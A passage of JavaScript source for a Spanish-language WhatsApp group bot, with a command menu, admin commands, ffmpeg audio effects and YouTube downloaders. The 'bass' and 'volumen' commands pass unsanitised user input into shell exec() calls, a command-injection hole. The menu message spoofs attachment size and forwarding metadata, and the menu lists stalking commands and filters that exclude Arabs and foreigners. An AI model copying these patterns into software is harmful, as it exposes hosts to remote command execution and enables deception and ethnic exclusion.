         *🧇「 R̷E̷P̷O̷R̷T̷A̷R̷ B̷U̷G̷S̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}?_
*𝕷⃝🧇 ∙* _${prefix}bug_
*𝕷⃝🧇 ∙* _${prefix}reporte_

         *🧇「 D̷E̷S̷C̷A̷R̷G̷A̷S̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}igdl_
*𝕷⃝🧇 ∙* _${prefix}tiktok_
*𝕷⃝🧇 ∙* _${prefix}twitter_
*𝕷⃝🧇 ∙* _${prefix}facebook_
*𝕷⃝🧇 ∙* _${prefix}mediafire_
*𝕷⃝🧇 ∙* _${prefix}ighistoria_

         *🧇「 B̷U̷S̷Q̷U̷E̷D̷A̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}xnxx_
*𝕷⃝🧇 ∙* _${prefix}phub_
*𝕷⃝🧇 ∙* _${prefix}google_
*𝕷⃝🧇 ∙* _${prefix}imagen_
*𝕷⃝🧇 ∙* _${prefix}wattpad_
*𝕷⃝🧇 ∙* _${prefix}ytbusqueda_
*𝕷⃝🧇 ∙* _${prefix}pinterest_
*𝕷⃝🧇 ∙* _${prefix}playstore_

         *🧇「 S̷T̷A̷L̷K̷I̷N̷G̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}igstalk_
*𝕷⃝🧇 ∙* _${prefix}tiktokstalk_

         *🧇「 C̷R̷E̷A̷D̷O̷R̷E̷S̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}zalgo_
*𝕷⃝🧇 ∙* _${prefix}emoji_
*𝕷⃝🧇 ∙* _${prefix}texto_
*𝕷⃝🧇 ∙* _${prefix}toimg_
*𝕷⃝🧇 ∙* _${prefix}tomp4_
*𝕷⃝🧇 ∙* _${prefix}tourl_
*𝕷⃝🧇 ∙* _${prefix}robar_
*𝕷⃝🧇 ∙* _${prefix}sticker_
*𝕷⃝🧇 ∙* _${prefix}sticker2_

         *🧇「 M̷Ú̷S̷I̷C̷A̷ D̷E̷S̷C̷A̷R̷G̷A̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}ytdl_
*𝕷⃝🧇 ∙* _${prefix}ytmp3_
*𝕷⃝🧇 ∙* _${prefix}ytmp4_
*𝕷⃝🧇 ∙* _${prefix}youfix_
*𝕷⃝🧇 ∙* _${prefix}playmp4_
*𝕷⃝🧇 ∙* _${prefix}playmp3_

         *🧇「 E̷F̷E̷C̷T̷O̷S̷ A̷U̷D̷I̷O̷/̷V̷I̷D̷E̷O̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}bass_
*𝕷⃝🧇 ∙* _${prefix}lento_
*𝕷⃝🧇 ∙* _${prefix}rapido_
*𝕷⃝🧇 ∙* _${prefix}reversa_
*𝕷⃝🧇 ∙* _${prefix}volumen_
*𝕷⃝🧇 ∙* _${prefix}fantasma_
*𝕷⃝🧇 ∙* _${prefix}monstruo_
*𝕷⃝🧇 ∙* _${prefix}lentocore_
*𝕷⃝🧇 ∙* _${prefix}nightcore_
*𝕷⃝🧇 ∙* _${prefix}camaralenta_
*𝕷⃝🧇 ∙* _${prefix}camararapida_
*𝕷⃝🧇 ∙* _${prefix}camarareversa_

         *🧇「 J̷U̷E̷G̷O̷S̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}xo_
*𝕷⃝🧇 ∙* _${prefix}reiniciarxo_
*𝕷⃝🧇 ∙* _${prefix}cs_
*𝕷⃝🧇 ∙* _${prefix}dado_

         *🧇「 H̷E̷R̷R̷A̷M̷I̷E̷N̷T̷A̷S̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}ocr_
*𝕷⃝🧇 ∙* _${prefix}tomp3_
*𝕷⃝🧇 ∙* _${prefix}get64_
*𝕷⃝🧇 ∙* _${prefix}gethex_
*𝕷⃝🧇 ∙* _${prefix}perfil_
*𝕷⃝🧇 ∙* _${prefix}captura_
*𝕷⃝🧇 ∙* _${prefix}leermas_
*𝕷⃝🧇 ∙* _${prefix}contacto_
*𝕷⃝🧇 ∙* _${prefix}inspeccionar_

         *🧇「 E̷X̷T̷R̷A̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}speed_
*𝕷⃝🧇 ∙* _${prefix}tienda_
*𝕷⃝🧇 ∙* _${prefix}tienda2_
*𝕷⃝🧇 ∙* _${prefix}fakeloc_
*𝕷⃝🧇 ∙* _${prefix}fakepdf_
*𝕷⃝🧇 ∙* _${prefix}runtime_
*𝕷⃝🧇 ∙* _${prefix}creador_

         *🧇「 M̷E̷N̷C̷I̷O̷N̷E̷S̷̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}tag_
*𝕷⃝🧇 ∙* _${prefix}noti_
*𝕷⃝🧇 ∙* _${prefix}taggif_
*𝕷⃝🧇 ∙* _${prefix}tagapk_
*𝕷⃝🧇 ∙* _${prefix}hidetag_
*𝕷⃝🧇 ∙* _${prefix}mencion_
*𝕷⃝🧇 ∙* _${prefix}tagvideo_
*𝕷⃝🧇 ∙* _${prefix}tagaudio_
*𝕷⃝🧇 ∙* _${prefix}tagimagen_
*𝕷⃝🧇 ∙* _${prefix}tagcontacto_

         *🧇「 A̷D̷M̷I̷N̷S̷ 」🧇* 

*𝕷⃝🧇 ∙* _${prefix}echar_
*𝕷⃝🧇 ∙* _${prefix}sider_
*𝕷⃝🧇 ∙* _${prefix}fotog_
*𝕷⃝🧇 ∙* _${prefix}descg_
*𝕷⃝🧇 ∙* _${prefix}online_
*𝕷⃝🧇 ∙* _${prefix}viewto_
*𝕷⃝🧇 ∙* _${prefix}demote_
*𝕷⃝🧇 ∙* _${prefix}enlace_
*𝕷⃝🧇 ∙* _${prefix}hablen_
*𝕷⃝🧇 ∙* _${prefix}nombreg_
*𝕷⃝🧇 ∙* _${prefix}promote_
*𝕷⃝🧇 ∙* _${prefix}votacion_
*𝕷⃝🧇 ∙* _${prefix}unavista_
*𝕷⃝🧇 ∙* _${prefix}silencio_
*𝕷⃝🧇 ∙* _${prefix}antidelete_
*𝕷⃝🧇 ∙* _${prefix}bienvenida_
*𝕷⃝🧇 ∙* _${prefix}antiarabes_
*𝕷⃝🧇 ∙* _${prefix}antienlace_
*𝕷⃝🧇 ∙* _${prefix}delvotacion_
*𝕷⃝🧇 ∙* _${prefix}antihidetag_
*𝕷⃝🧇 ∙* _${prefix}antiextranjeros_`
buttons = [{
                    "buttonId": `${prefix}info`,
                    "buttonText": {
                        "displayText": "🧇 THANKS TO 🧇"
                    },
                    "type": "RESPONSE"
                },{
                    "buttonId": `${prefix}stats`,
                    "buttonText": {
                        "displayText": "🧇 BOT STATS 🧇"
                    },
                    "type": "RESPONSE"
                }]
Mek = fs.readFileSync('./src/kev.pdf')
documentMessage = (await kev.prepareMessage(from, Mek, 'documentMessage',{ quoted: vin, "mimetype": "application/pdf", filename: "_`Keͥ͢vͣıͫ͘͜𝜂 🧇", "title": "kevin.pdf","pageCount": 999999, thumbnail: fs.readFileSync('./media/name.jpg')})).message.documentMessage
documentMessage["fileLength"] = 9999999999
documentMessage["pageCount"] = 999999
buttonsMessage = { contentText: `      Hey Hola @${senderfix.split('@')[0]} 🧇`,
footerText: `${menuxx}`,
documentMessage,
buttons,headerType: 'DOCUMENT'}
prep2 = await kev.prepareMessageFromContent(from, { buttonsMessage }, { sendEphemeral:true, quoted: vin, contextInfo: {mentionedJid: [senderfix], "forwardingScore": 9999,"pageCount": 999999, "isForwarded": true}})
kev.relayWAMessage(prep2)
break
    case 'demote':
    case 'quitar':
    if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
      if (!arg) return reply(`*Para quitarle administración a un usuario usa el comando: ${prefix}quitar @usuario o tambien puedes usar su numero ejemplo: ${prefix}quitar 50766666666*`)
      if (vin.message.extendedTextMessage != undefined){
            mentioned = vin.message.extendedTextMessage.contextInfo.mentionedJid
            demote2 = `*Listo administración Quitada..*`
            kev.sendMessage(from, demote2, MessageType.text, fakevin)
      demote(from, mentioned)
      } else {
      kev.sendMessage(from, demote2, MessageType.text, fakevin)
      demote(from, [args[0] + '@s.whatsapp.net'])
      }
    break
case "echar":
if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
    if (
          vin.message.extendedTextMessage === null ||
          vin.message.extendedTextMessage === undefined
        )
          return;
        if (
          vin.message.extendedTextMessage.contextInfo.participant === undefined
        ) {
          entah = vin.message.extendedTextMessage.contextInfo.mentionedJid;
if (entah[0] == kev.user.jid) return
          if (entah.length > 1) {
            var mems_ids = [];
            for (let ids of entah) {
              mems_ids.push(ids);
            }
            kick(from, mems_ids);
          } else {
            kev.groupRemove(from, [entah[0]]);
          }
        } else {
          entah = vin.message.extendedTextMessage.contextInfo.participant;
          kick(from, [entah]);
        }
        break;
case 'nombreg':
if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                kev.groupUpdateSubject(from, `${arg}`)
                  kev.sendMessage(from, `El nombre del grupo ha sido modificado, ahora el nombre es: *${arg}*`, MessageType.text, {quoted: vin})
            break
            case 'descg':
            if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                kev.groupUpdateDescription(from, `${arg}`)
                  kev.sendMessage(from, `La descripción del grupo *${groupMetadata.subject}* ha sido modificada\n\nNueva Descripción: *${arg}*`, MessageType.text, {quoted: vin})
            break
            case 'fotog':
            if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                  media2 = await kev.downloadAndSaveMediaMessage(vin)
                  await kev.updateProfilePicture (from, medi2a)
                  kev.sendMessage(from, `*La foto del grupo ha sido modificada*`, MessageType.image, {quoted: vin})
            break
/// EFECTOS DE SONIDO
case 'nightcore':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
          if (!isQuotedAudio) return reply('Menciona el audio que quieres volver estilo NightCore')
              reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
              encmediaNG = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
                  roll = await kev.downloadAndSaveMediaMessage(encmediaNG)
                  ran = getRandom('.mp3')
                  exec(`ffmpeg -i ${roll} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(roll)
                  if (err) return reply('Ups algo ha salido mal....')
                  hah = fs.readFileSync(ran)
                  kev.sendMessage(from, hah, audio, { mimetype: "audio/mp4", ptt: true, quoted: vin, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(ran)
                  })
            break
        case 'bass':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!isQuotedAudio) return reply(`Boostea una música o audio que te guste mencionandolo con el comando: ${prefix}bass (cantidad de bass)\n\nejemplo: *${prefix}bass 10*\n\n*El limite del booster es de 80.*`)
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            encmediaBA = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vin
            roll2 = await kev.downloadAndSaveMediaMessage(encmediaBA)
            ren = getRandom('.mp3')
                  exec(`ffmpeg -i ${roll2} -af equalizer=f=${args}:width_type=o:width=2:g=30 ${ren}`, (err, stderr, stdout) => {
                  fs.unlinkSync(roll2)
                  if (err) return reply('Ups algo ha salido mal....')
                  hah = fs.readFileSync(ren)
                  kev.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt:true, quoted: vin, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(ren)
                  })
            break
        case 'fantasma':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
          if (!isQuotedAudio) return reply('Menciona el audio que quieres volver estilo Fantasma')
                reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
                encmediaGH = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
                roll3 = await kev.downloadAndSaveMediaMessage(encmediaGH)
                rin = getRandom('.mp3')
                exec(`ffmpeg -i ${roll3} -filter:a "atempo=1.6,asetrate=3486" ${rin}`, (err, stderr, stdout) => {
                fs.unlinkSync(roll3)
                if (err) return reply('Ups algo ha salido mal....')
                hah = fs.readFileSync(rin)
                  kev.sendMessage(from, hah, audio,{ mimetype: "audio/mp4", ptt: true, quoted: vin, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(rin)
                  })
            break
        case 'lento':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
          if (!isQuotedAudio) return reply('Menciona el audio que quieres volver estilo SlowMotion')
                  reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
                  encmediaSL = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
                  roll4 = await kev.downloadAndSaveMediaMessage(encmediaSL)
                  ron = getRandom('.mp3')
                  exec(`ffmpeg -i ${roll4} -filter:a "atempo=0.7,asetrate=44100" ${ron}`, (err, stderr, stdout) => {
                  fs.unlinkSync(roll4)
                  if (err) return reply('Ups algo ha salido mal....')
                  hah = fs.readFileSync(ron)
                  kev.sendMessage(from, hah, audio,{ mimetype: "audio/mp4", ptt: true, quoted: vin, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(ron)
                  })
            break
        case 'lentocore':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
          if (!isQuotedAudio) return reply('Menciona el audio que quieres volver estilo SlowMotion NightCore')
                  reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
                  encmediaTP = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
                  roll5 = await kev.downloadAndSaveMediaMessage(encmediaTP)
                  run = getRandom('.mp3')
                  exec(`ffmpeg -i ${roll5} -filter:a "atempo=0.5,asetrate=65100" ${run}`, (err, stderr, stdout) => {
                  fs.unlinkSync(roll5)
                  if (err) return reply('Ups algo ha salido mal....')
                  hah = fs.readFileSync(run)
                  kev.sendMessage(from, hah, audio,{ mimetype: "audio/mp4", ptt: true, quoted: vin, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(run)
                  })
            break
        case 'rapido':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
          if (!isQuotedAudio) return reply('Menciona el audio que quieres acelerar')
                  reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
                  encmediaBL = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
                  roll6 = await kev.downloadAndSaveMediaMessage(encmediaBL)
                  rhan = getRandom('.mp3')
                  exec(`ffmpeg -i ${roll6} -filter:a "atempo=0.9,asetrate=95100" ${rhan}`, (err, stderr, stdout) => {
                  fs.unlinkSync(roll6)
                  if (err) return reply('Ups algo ha salido mal....')
                  hah = fs.readFileSync(rhan)
                  kev.sendMessage(from, hah, audio,{ mimetype: "audio/mp4", ptt: true, quoted: vin, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                  fs.unlinkSync(rhan)
                  })
            break
        case 'volumen':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!isQuotedAudio) return reply('Menciona el audio que quieres subirle el volumen')
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
encmediavolumen = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
mediavolumen = await kev.downloadAndSaveMediaMessage(encmediavolumen)
    ran = getRandom('.mp3')
    exec(`ffmpeg -i ${mediavolumen} -filter:a "volume=${q}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediavolumen)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
kev.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: vin})
fs.unlinkSync(ran)
    })
break
case 'reversa':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!isQuotedAudio) return reply('Menciona el audio que quieres poner en reversa')
reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
encmediareversa = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
mediareversa = await kev.downloadAndSaveMediaMessage(encmediareversa)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${mediareversa} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediareversa)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
kev.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: vin})
fs.unlinkSync(ran)
    })
break
        case 'monstruo':
        if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (!isQuotedAudio) return reply('Menciona el audio que quieres volver estilo Monstruo')
                  reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
                  encmediaGE = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
                  roll7 = await kev.downloadAndSaveMediaMessage(encmediaGE)
                  rhen = getRandom('.mp3')
                  exec(`ffmpeg -i ${roll7} -filter:a "atempo=1.6,asetrate=22100" ${rhen}`, (err, stderr, stdout) => {
                  fs.unlinkSync(roll7)
                  if (err) return reply('Ups algo ha salido mal....')
                  hah = fs.readFileSync(rhen)
                  kev.sendMessage(from, hah, audio,{ mimetype: "audio/mp4", ptt: true, quoted: vin})
                  fs.unlinkSync(rhen)
                  })
            break
///
case 'playmp3':
			if (args.length < 1) return reply(`Para descargar una música solo usa: *${prefix + command} musica*`)
			reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
ytMp3(q)
			.then( async res => {
			ply3 = await axios.get(`https://tinyurl.com/api-create.php?url=${res.url}`)
			const playmp3 = `\`\`\`『 YOUTUBEPLAY MP3 』\`\`\`\n\n*•🛸 Título :* _${res.title}_\n\n*• 🎥 Canal :* _${res.channel}_\n\n*• 🎁 Tipo :* _Mp3/Audio_\n\n*• 🎞️ Vistas :* _${h2k(res.views)}_\n\n*• 🌐 Publicado :* _${res.published}_\n\n*• 📥 Url Descarga :* ${ply3.data}\n\n_Por favor espera | Se esta enviando la música._`
			kev.sendMessage(from, playmp3, MessageType.text, {quoted: null, contextInfo: { externalAdReply : { title : `${res.title}`, body : `${res.channel}`, previewType : "PHOTO", mediaType: 2, thumbnailUrl: `${res.thumb}`, thumbnail: fakeimg, mediaUrl : `${res.url}`} } } )
			await sleep(2000)
kev.sendMessage(from, await getBuffer(res.url), "audioMessage", {mimetype: "audio/mp4", filename: `kevin.mp3`, quoted: vin} )
			})
			.catch(e => {
			reply('Ups Error, Algo Fallo')
			console.log(e)
			})
			break
		case 'playmp4':
			if (args.length < 1) return reply(`Para descargar un video solo usa: *${prefix + command} nombre*`)
			reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
            ytMp4(q)
			.then(async res => {
			ply4 = await axios.get(`https://tinyurl.com/api-create.php?url=${res.url}`)
			const playmp4 = `\`\`\`『 YOUTUBEPLAY MP4 』\`\`\`\n\n*•🛸 Título :* _${res.title}_\n\n*• 🎥 Canal :* _${res.channel}_\n\n*• 🎁 Tipo :* _Mp4/Video_\n\n*• 🎞️ Vistas :* _${h2k(res.views)}_\n*• 🌐 Publicado :* _${res.published}_\n\n*• 📥 Url Descarga :* ${ply4.data}\n\n_Por favor espera | Se esta enviando el video._`
			const playmp42 = `\`\`\`『 YOUTUBEPLAY MP4 』\`\`\`\n\n*•🛸 Título :* _${res.title}_\n\n*• 🎥 Canal :* _${res.channel}_\n\n*• 🎁 Tipo :* _Mp4/Video_\n\n*• 🎞️ Vistas :* _${h2k(res.views)}_\n*• 🌐 Publicado :* _${res.published}_\n\n*• 📥 Url Descarga :* ${ply4.data}`
			kev.sendMessage(from, playmp4, MessageType.text, { quoted: null, contextInfo: { externalAdReply : { title : `${res.title}`, body : `${res.channel}`, previewType : "PHOTO", mediaType: 2, thumbnailUrl: `${res.thumb}`, thumbnail: fakeimg, mediaUrl : `${res.url}`} } } )
			await sleep(2000)
sendFileFromDts(from, res.url, playmp42, vin)
			})
			.catch(e => {
			reply('Ups Error, Algo Fallo')
			console.log(e)
			})
			break
case 'ytmp4':
			if (args.length < 1) return reply(`_Para descargar un video por medio de enlace usa: ${prefix + command} nombre_`)
			if(!isUrl(args[0]) && args[0].includes('youtu.be')) return reply('Solamente se permiten enlaces de YouTube')
			reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
ytDonlodMp4(q)
			.then(async res => {
			yt4url = await axios.get(`https://tinyurl.com/api-create.php?url=${res[0].link}`)
			const ytmp4 = `\`\`\`『 YOUTUBEPLAY MP4 』\`\`\`\n\n*•🛸 Título :* ${res[0].judul}\n\n*•🧰 Tamaño :* ${res[0].size}\n\n*•💫 Calidad :* ${res[0].quality}Mpg\n\n*• 🎫 Enlace :* ${yt4url.data}\n\n_Por favor espera I El video se esta enviando_`
			const ytmp42 = `\`\`\`『 YOUTUBEPLAY MP4 』\`\`\`\n\n*•🛸 Título :* ${res[0].judul}\n\n*•🧰 Tamaño :* ${res[0].size}\n\n*•💫 Calidad :* ${res[0].quality}Mpg\n\n*• 🎫Enlace :* ${yt4url.data}`
			kev.sendMessage(from, ytmp4, MessageType.text, { quoted: null, contextInfo: { externalAdReply : { title : `${res[0].judul}`, body : `${res[0].size}`, previewType : "PHOTO", mediaType: 2, thumbnailUrl: `${res[0].thumb}`, thumbnail : fakeimg, mediaUrl : `${q}`} } } )
			//sendVideo(await getBuffer(res[0].link), ytmp42)
			await sleep(2000)
			sendFileFromDts(from, `${res[0].link}`, ytmp42, vin)
			})
			.catch(e => {
			reply('Ups Error, Algo Fallo')
			console.log(e)
			})
			break
		case 'ytmp3':
			if (args.length < 1) return reply(`_Para descargar una música por medio de enlace usa: ${prefix + command} nombre_`)
			if(!isUrl(args[0]) && args[0].includes('youtu.be'))return reply('Solamente se permiten enlaces de YouTube')
			reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
ytDonlodMp3(q)
			.then( async res => {
			yt3url = await axios.get(`https://tinyurl.com/api-create.php?url=${res[0].link}`)
